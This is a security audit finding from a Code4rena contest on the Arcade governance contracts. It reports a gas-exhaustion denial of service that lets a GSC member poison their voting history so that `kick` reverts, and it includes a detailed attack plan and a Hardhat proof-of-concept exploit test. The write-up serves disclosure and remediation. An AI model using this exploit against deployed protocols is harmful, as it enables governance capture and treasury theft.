# [M] If someone becomes GSC member, he may become unkickable forever

## Summary
Severity: Medium
Chain: Smart contract
Component: 2023-07-arcade
Published: 2023-07-28
Source: https://github.com/code-423n4/2023-07-arcade-findings/issues/412
Type: code-finding

## Details
# Lines of code

https://github.com/code-423n4/2023-07-arcade/blob/f8ac4e7c4fdea559b73d9dd5606f618d4e6c73cd/contracts/BaseVotingVault.sol#L96-L102
https://github.com/code-423n4/2023-07-arcade/blob/f8ac4e7c4fdea559b73d9dd5606f618d4e6c73cd/contracts/external/council/vaults/GSCVault.sol#L123
https://github.com/code-423n4/2023-07-arcade/blob/f8ac4e7c4fdea559b73d9dd5606f618d4e6c73cd/contracts/external/council/libraries/History.sol#L198-L199
https://github.com/code-423n4/2023-07-arcade/blob/f8ac4e7c4fdea559b73d9dd5606f618d4e6c73cd/contracts/ArcadeGSCVault.sol#L25


# Vulnerability details

*Note: some of the contracts mentioned are out of scope, but the vulnerability exists in the `BaseVotingVault`, which is in-scope, so I argue that the finding is in scope.*

In Arcade ecosystem, there is a GSC group which has some extra privileges like spending some token amount from treasury or creating new proposals in core voting contract.

In order to become a member of this group, user has to have high enough voting power (combined from several voting vaults) and call `proveMembership`. When user's voting power drops beneath a certain threshold, he may be kicked out of the GSC.

`proveMembership` contains the following code:
```solidity
for (uint256 i = 0; i < votingVaults.length; i++) {
            // Call the vault to check last block's voting power
            // Last block to ensure there's no flash loan or other
            // intra contract interaction
            uint256 votes =
                IVotingVault(votingVaults[i]).queryVotePower(
                    msg.sender,
                    block.number - 1,
                    extraData[i]
                );
            // Add up the votes
            totalVotes += votes;
        }
```
So, it basically iterates over all voting vaults that a user specifies, sums up his voting power, and if it's enough, it grants that user a place in GSC.

In order to kick user out from the GSC, the `kick` function may be used and it will iterate over all vaults that were supplied by a user when he called `proveMembership` and if his voting power dropped beneath the threshold, he will be removed from the GSC. `kick` contains the following code:
```solidity
        for (uint256 i = 0; i < votingVaults.length; i++) {
            // If the vault is not approved we don't count its votes now
            if (coreVoting.approvedVaults(votingVaults[i])) {
                // Call the vault to check last block's voting power
                // Last block to ensure there's no flash loan or other
                // intra contract interaction
                uint256 votes =
                    IVotingVault(votingVaults[i]).queryVotePower(
                        who,
                        block.number - 1,
                        extraData[i]
                    );
                // Add up the votes
                totalVotes += votes;
            }
        }
```
As we see, `queryVotePower` will be called again on each vault. Let's see how `queryVotePower` is implemented in `BaseVotingVault` which is used as a base contract for some voting contracts:
```solidity
    function queryVotePower(address user, uint256 blockNumber, bytes calldata) external override returns (uint256) {
        // Get our reference to historical data
        History.HistoricalBalances memory votingPower = _votingPower();


        // Find the historical data and clear everything more than 'staleBlockLag' into the past
        return votingPower.findAndClear(user, blockNumber, block.number - staleBlockLag);
    }
```
As we see, it will always call the `findAndClear` function that will return the most recent voting power and will attempt to erase some older entries. New entries are added for a user when his voting power changes and no more than `1` entry is added each block (if several changes happen in one block, values are just updated).

Now, attacker (Bob) may perform the following attack:
1. He acquires enough votes to become GSC member (he can either just buy enough tokens or deploy a smart contract that will offer high yield for users who stake their vault tokens there).
2. He calls `proveMembership` and specifies `NFTBoostVault` as a proof. He will be accepted.
3. He "poisons" his voting power history by delegating from and redelegating to himself some dust token amount in several thousand different blocks (possible to do in less than `12h` on Ethereum).
4. He withdraws all his tokens from `NFTBoostVault`.
5. Alice spots that Bob doesn't have enough voting power anymore and will attempt to kick him, but since `findAndClear` will try to erase several thousand entries, it will exceed Ethereum block limit for gas and the transaction will revert with Out Of Gas exception (`kick` will iterate over all vaults supplied by Bob, so Alice is forced to call `queryVotePower` on the vault that Bob used for the attack).
6. Bob can now send tokens to his another account, repeat the attack and he can do this until he has `>50%` in the GSC.

Similar exploit was presented by me in a different submission, but this one is different, since the previous one focused on different aspect of that DoS attack - changing voting outcome. Here, I'm showing how somebody can permanently become a GSC member.

As reported in that different submission, the cost of performing the attack once is `~14ETH`, so it's not that much (currently `14ETH = $1880 * 14 = $26320`), but it may be worth it to perform this attack in order to be able to get `>50%` of GSC. 

## Impact
Attacker is able to become a permanent GSC member, even if he doesn't stake any tokens, which shouldn't be allowed and already has a huge impact on the protocol.

Even worse, he may try to acquire `> 50%` of voting power (GSC shouldn't have too many members - probably about `10` or something like this). Still, the GSC owner has `100000` votes, but it is a timelock contract, so might not be able to react fast enough to veto malicious proposals and even if it is, this attack will destroy the entire GSC (since, from now on, the owner will decide about everything making GSC members useless), which is an important concept in the Arcade protocol.

Hence, the impact is huge (and assets can be lost, since GSC is able to spend some tokens from the treasury) and there aren't any external factors allowed. So, I'm submitting this issue as High.

## Proof of Concept
Several modifications are necessary in order to run the test - they are only introduced to make testing easier and don't have anything in common with the attack itself. First of all, please change `Authorizable::setOwner` as follows:
```solidity
    function setOwner(address who) public /*onlyOwner()*/ {
```
Then, please change `NFTBoostVault` so that withdrawals are possible:
```solidity
constructor(
        IERC20 token,
        uint256 staleBlockLag,
        address timelock,
        address manager
    ) BaseVotingVault(token, staleBlockLag) {
        if (timelock == address(0)) revert NBV_ZeroAddress("timelock");
        if (manager == address(0)) revert NBV_ZeroAddress("manager");

        Storage.set(Storage.uint256Ptr("initialized"), 1);
        Storage.set(Storage.addressPtr("timelock"), timelock);
        Storage.set(Storage.addressPtr("manager"), manager);
        Storage.set(Storage.uint256Ptr("entered"), 1);
        Storage.set(Storage.uint256Ptr("locked"), 0); // line changed
    }
```
Then, please add a basic `ERC20` token implementation to a `TestERC20.sol` file in the `contracts/test` directory (it's only used to mint some tokens to the users):
```solidity
// SPDX-License-Identifier: MIT

pragma solidity 0.8.18;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract TestERC20 is ERC20 
{
    constructor() ERC20("TestERC20", "TERC20") {
        
    }

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}
```

Finally, please put the following test inside `ArcadeGscVault.ts` (`import { mine } from "@nomicfoundation/hardhat-network-helpers";` will have to be also inserted there):
```
describe("Unkickable from GSC vault", async () => {
        it("Unkickable from GSC vault", async () => {
            const { coreVoting, arcadeGSCVault } = ctxGovernance;
            const signers = await ethers.getSigners();
            const owner = signers[0];
            const Alice = signers[1];
            const Bob = signers[2];

            // balance of each user in TestERC20 custom token
            const ALICES_BALANCE = ethers.utils.parseEther("1000000000");
            const BOBS_BALANCE = ethers.utils.parseEther("100"); // enough to join GSC

            const TestERC20Factory = await ethers.getContractFactory("TestERC20");
            const TestERC20 = await TestERC20Factory.deploy();

            // mine some block in the future to resemble mainnet state
            await mine(1_000_000);

            // deploy NFTBoostVault with custom token (TestERC20) - we only need this token to provide some
            // balance to users so that they can stake their tokens in the vault
            const NFTBoostVaultFactory = await ethers.getContractFactory("NFTBoostVault");
            const NFTBoostVault = await NFTBoostVaultFactory.deploy(TestERC20.address, 10, owner.address, owner.address);

            // set owner just to be able to call `changeVaultStatus`, so that testing is easier
            await coreVoting.connect(owner).setOwner(owner.address);
            await coreVoting.connect(owner).changeVaultStatus(NFTBoostVault.address, true);

            // mint TestERC20 to users so that they can stake them
            await TestERC20.connect(Alice).mint(Alice.address, ALICES_BALANCE);
            await TestERC20.connect(Bob).mint(Bob.address, BOBS_BALANCE);

            // everyone approves TestERC20, so that they can stake
            await TestERC20.connect(Alice).approve(NFTBoostVault.address, ALICES_BALANCE);
            await TestERC20.connect(Bob).approve(NFTBoostVault.address, BOBS_BALANCE);

            // Alice and Bob add some tokens and delegate
            await NFTBoostVault.connect(Alice).delegate(Alice.address);
            await NFTBoostVault.connect(Alice).addTokens(ALICES_BALANCE);
            
            await NFTBoostVault.connect(Bob).delegate(Bob.address);
            await NFTBoostVault.connect(Bob).addTokens(BOBS_BALANCE);
            
            // Alice becomes GSC member since she has enough voting power
            expect(await arcadeGSCVault.members(Alice.address)).to.eq(0);
            await arcadeGSCVault.connect(Alice).proveMembership([NFTBoostVault.address], ["0x"]);
            expect(await arcadeGSCVault.members(Alice.address)).not.to.eq(0);

            // Bob also becomes GSC member, but when he unstakes his tokens, Alice can kick him out
            await arcadeGSCVault.connect(Bob).proveMembership([NFTBoostVault.address], ["0x"]);
            expect(await arcadeGSCVault.members(Bob.address)).not.to.eq(0);

            await NFTBoostVault.connect(Bob).withdraw(BOBS_BALANCE);
            await arcadeGSCVault.connect(Alice).kick(Bob.address, ["0x"]);
            expect(await arcadeGSCVault.members(Bob.address)).to.eq(0);
            // kicking out Bob succeeds

            // Bob adds tokens again and becomes GSC member, but this time performs the attack
            await TestERC20.connect(Bob).approve(NFTBoostVault.address, BOBS_BALANCE);
            await NFTBoostVault.connect(Bob).delegate(Bob.address);
            await NFTBoostVault.connect(Bob).addTokens(BOBS_BALANCE);
            await arcadeGSCVault.connect(Bob).proveMembership([NFTBoostVault.address], ["0x"]);

            // attack
            // Bob performs it on himself
            var gasUsed = 0;
            for (var i = 0; i < 3500; i++)
            {
                const tx1 = await NFTBoostVault.connect(Bob).delegate(Alice.address); // needed since it's 
                // impossible to change current delegatee to the same address
                const tx2 = await NFTBoostVault.connect(Bob).delegate(Bob.address);
                const r1 = await tx1.wait();
                const r2 = await tx2.wait();
                gasUsed += r1.cumulativeGasUsed.toNumber();
                gasUsed += r2.cumulativeGasUsed.toNumber();
            }
            console.log(`Gas used by the attacker: ${gasUsed}`);

            // Bob withdraws his tokens
            await NFTBoostVault.connect(Bob).withdraw(BOBS_BALANCE);
            
            // Alice cannot kick out Bob
            await expect(arcadeGSCVault.connect(Alice).kick(Bob.address, ["0x"])).to.be.reverted;

            // Bob is still GSC member; he can now transfer all his tokens to another account and perform
            // the attack again until he controls > 50% of GSC
            expect(await arcadeGSCVault.members(Bob.address)).not.to.eq(0);

        }).timeout(400000);
    });
```

## Tools Used
VS Code, hardhat

## Recommended Mitigation Steps
Change `BaseVotingVault::queryVotePower` implementation so that it calls `find` instead of `findAndClear` (as in the `queryVotePowerView`).


## Assessed type

DoS
